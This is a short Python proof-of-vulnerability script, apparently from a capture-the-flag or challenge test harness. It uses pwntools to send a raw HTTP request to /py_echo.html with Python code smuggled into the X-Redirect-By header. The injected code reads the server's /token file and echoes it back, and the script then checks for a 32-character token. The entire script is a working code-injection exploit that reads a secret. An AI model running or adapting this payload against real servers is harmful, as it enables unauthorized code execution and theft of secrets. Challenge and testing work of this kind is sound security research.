import sys
import struct
import requests
from requests.auth import HTTPBasicAuth, HTTPDigestAuth
from pwn import *

def handler( signum, frame):
    print('sigalrm fired - time ran out')
    print('[ERROR] POV Failed')
    exit(0)

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)
    print('Host ' + os.environ['HOST'] + ' and PORT: ' + os.environ['PORT'])

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)

    p = remote(HOST, PORT)

    data = 'POST /py_echo.html HTTP/1.1\r\nHost: '+ HOST + ':' + str(PORT) + '\r\nX-Redirect-By: print(\'Hello Python\');f = open(\'/token\', \'r\');token = f.read();filter.write(token)\r\n\r\n'
    
    p.send(data)
    r = p.recv().decode('utf-8')
    f = r.find("200")

    if f > 0:
        p.close()
        lines = r.splitlines()

        if len(lines[19]) == 32:
            print('TOKEN=' + lines[19])
            print('[SUCCESS] POV Succeeded')
            exit(0)
    print('[FAILED] POV Failed')

if __name__ == '__main__':
    main()
